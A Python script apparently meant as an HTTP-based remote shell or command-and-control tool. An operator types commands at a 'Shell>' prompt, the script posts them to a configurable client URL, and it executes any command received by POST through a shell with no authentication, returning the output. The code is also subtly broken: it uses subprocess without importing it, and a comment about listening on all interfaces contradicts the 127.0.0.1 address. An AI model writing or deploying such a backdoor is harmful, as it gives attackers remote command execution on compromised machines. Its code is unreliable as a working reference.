import requests
from http.server import BaseHTTPRequestHandler, HTTPServer

HOST_NAME = '127.0.0.1'  # Listen on all available interfaces
PORT_NUMBER = 80
CLIENT_URL = 'http://127.0.0.1:8080'  # Update with the actual client URL

class MyHandler(BaseHTTPRequestHandler):

    def send_command_to_client(self, command):
        try:
            response = requests.post(url=CLIENT_URL, data=command.encode('utf-8'))
            response.raise_for_status()
            return response.text
        except requests.exceptions.RequestException as e:
            return f"Error sending command to client: {e}"

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        command = input("Shell> ")
        output = self.send_command_to_client(command)

        response_data = f"Command sent to client. Response:\n{output}"
        self.wfile.write(response_data.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        command = post_data.decode('utf-8')
        response = self.execute_command(command)

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(response.encode())

    def execute_command(self, command):
        try:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output, error = CMD.communicate()
            return f"Output:\n{output.decode('utf-8')}\nError:\n{error.decode('utf-8')}"
        except Exception as e:
            return f"Exception: {str(e)}"

if __name__ == '__main__':
    server_class = HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)

    try:
        print(f"[*] Server started on http://{HOST_NAME}:{PORT_NUMBER}/")
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()
